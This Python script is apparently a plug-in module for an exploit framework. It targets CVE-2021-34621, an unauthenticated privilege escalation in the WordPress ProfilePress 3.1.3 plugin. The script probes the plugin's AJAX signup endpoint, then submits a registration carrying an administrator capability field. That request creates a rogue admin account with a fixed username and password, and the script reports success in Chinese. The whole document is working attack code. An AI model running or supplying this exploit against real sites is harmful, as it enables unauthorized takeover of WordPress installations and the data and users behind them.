# coding: utf-8
import requests
import random

def vuln_check(uri):
    response = requests.get(uri)
    raw = response.text
    if "This username is invalid" in raw:
        return True
    else:
        return False

#WordPress Plugin ProfilePress 3.1.3 - Privilege Escalation (Unauthenticated)
def poc(url,user_agent,proxy):

    url = url.strip("/")
    ajax_action = 'pp_ajax_signup'
    admin = '/wp-admin/admin-ajax.php'
    url = url + admin + '?action=' + ajax_action
    check = vuln_check(url)
    if not check:
        return

    header = {
        'User-Agent': user_agent,
        'Content-Type':'application/x-www-form-urlencoded'
    }

    data = {
        "reg_username": "admin1",
        "reg_password": "123.com",
        "reg_password_present": "true",
        "reg_email": "test@test.com",
        "wp_capabilities[administrator]": 1,
        'reg_first_name':'admin1',
        'reg_last_name':'admin1'
    }

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.post(url, headers=header,data=data, proxies=proxies)
    else:
        response = requests.post(url, headers=header,data=data)

    if 'profilepress-reg-status' in response.text:
        if 'successful' in response.text:
            return 'WordPress Plugin ProfilePress 3.1.3 - 提权提升漏洞   注册成功：admin1  123.com'
        else:
            return 'WordPress Plugin ProfilePress 3.1.3 - 提权提升漏洞   漏洞编号：CVE-2021-34621'


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','')
